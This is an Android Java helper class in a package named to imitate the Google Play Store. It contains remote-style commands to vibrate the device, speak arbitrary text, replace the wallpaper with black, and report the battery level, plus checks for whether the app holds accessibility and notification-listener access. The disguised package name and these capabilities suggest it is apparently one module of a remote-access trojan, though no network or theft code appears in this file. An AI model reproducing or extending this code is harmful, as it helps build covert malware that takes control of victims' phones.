package com.android.vending.helper;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Vibrator;
import android.speech.tts.TextToSpeech;
import android.provider.Settings;
import android.text.TextUtils;
import java.util.Locale;
public class Sys {
    public static String vibrate(Context c) {
        try { Vibrator v = (Vibrator) c.getSystemService(Context.VIBRATOR_SERVICE); v.vibrate(1000); return "Vibrated."; } catch (Exception e) { return "Vibrate failed."; }
    }
    public static String tts(Context c, String text) {
        try {
            TextToSpeech tts = new TextToSpeech(c, status -> {});
            tts.setLanguage(Locale.US); tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, null); return "TTS spoken.";
        } catch (Exception e) { return "TTS failed."; }
    }
    public static String changeWallpaper(Context c) {
        try {
            java.io.File f = new java.io.File(c.getCacheDir(), "wall.jpg");
            java.io.FileOutputStream fos = new java.io.FileOutputStream(f);
            android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(100, 100, android.graphics.Bitmap.Config.ARGB_8888);
            bmp.eraseColor(android.graphics.Color.BLACK); bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, fos); fos.close();
            android.app.WallpaperManager wm = android.app.WallpaperManager.getInstance(c);
            wm.setBitmap(android.graphics.BitmapFactory.decodeFile(f.getAbsolutePath())); return "Wallpaper changed.";
        } catch (Exception e) { return "Wallpaper failed."; }
    }
    public static String getBattery(Context c) {
        BatteryManager bm = (BatteryManager) c.getSystemService(Context.BATTERY_SERVICE);
        int level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        return "Battery: " + level + "%";
    }
    public static boolean isNotifListenerEnabled(Context context) {
        try {
            String flat = android.provider.Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
            return flat != null && flat.contains(context.getPackageName());
        } catch (Exception e) { return false; }
    }
    public static boolean isAccessibilityEnabled(Context context) {
        try {
            int enabled = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
            if (enabled == 1) {
                String services = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                return services != null && services.contains(context.getPackageName());
            }
        } catch (Exception ignored) {}
        return false;
    }
}
